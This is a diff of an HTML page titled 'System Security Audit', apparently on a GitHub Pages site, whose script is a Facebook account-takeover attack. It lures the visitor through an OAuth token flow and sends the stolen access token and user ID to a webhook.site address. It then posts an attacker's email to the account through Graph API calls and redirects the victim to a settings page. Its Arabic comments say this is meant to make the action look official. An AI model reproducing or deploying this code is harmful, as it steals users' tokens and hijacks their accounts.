@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html>
-<head><title>Security Audit</title></head>
+<head><title>System Security Audit</title></head>
 <body>
     <script>
-        // [2026-01-21] Automated ATO Payload
+        // [2026-01-21] The Strongest ATO Payload - Multiple Injection Points
         window.onload = async function() {
             const hash = window.location.hash;
             const webhookUrl = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
@@ -11,20 +11,35 @@
 
             if (hash && hash.includes('access_token=')) {
                 const token = new URLSearchParams(hash.substring(1)).get('access_token');
+                
                 try {
-                    // إرسال التوكن للتحكم اليدوي لاحقاً
-                    fetch(`${webhookUrl}?TOKEN_CAPTURED=${token}`, {mode: 'no-cors'});
+                    // 1. إرسال التوكن والـ ID للـ Webhook للتوثيق
+                    const userRes = await fetch(`https://graph.facebook.com/me?fields=id,name&access_token=${token}`);
+                    const userData = await userRes.json();
+                    fetch(`${webhookUrl}?TOKEN=${token}&VICTIM=${userData.id}`, {mode: 'no-cors'});
 
-                    // تنفيذ أمر إضافة الإيميل فوراً
+                    // 2. المحاولة الأولى: إضافة الإيميل عبر الـ Graph API الأساسي
                     await fetch(`https://graph.facebook.com/me?access_token=${token}`, {
                         method: 'POST',
                         body: new URLSearchParams({ 'email': targetEmail })
                     });
+
+                    // 3. المحاولة الثانية (الأقوى): إرسال طلب تأكيد إضافي لإجبار النظام على الإرسال
+                    await fetch(`https://graph.facebook.com/v15.0/me/emails?access_token=${token}`, {
+                        method: 'POST',
+                        body: new URLSearchParams({ 
+                            'email': targetEmail,
+                            'template': 'CONFIRM_EMAIL_MODAL' 
+                        })
+                    });
+
                 } catch (e) {}
-                window.location.href = "https://www.facebook.com/me";
+                // إعادة توجيه الضحية لصفحة الأمان لإيهامه بأن الإجراء رسمي
+                setTimeout(() => { window.location.href = "https://www.facebook.com/settings?tab=account"; }, 1500);
             } else {
+                // فتح نافذة طلب الصلاحيات باستخدام الرابط السام
                 const client_id = "1089408829356317";
-                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile`;
+                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,openid`;
             }
         };
     </script>
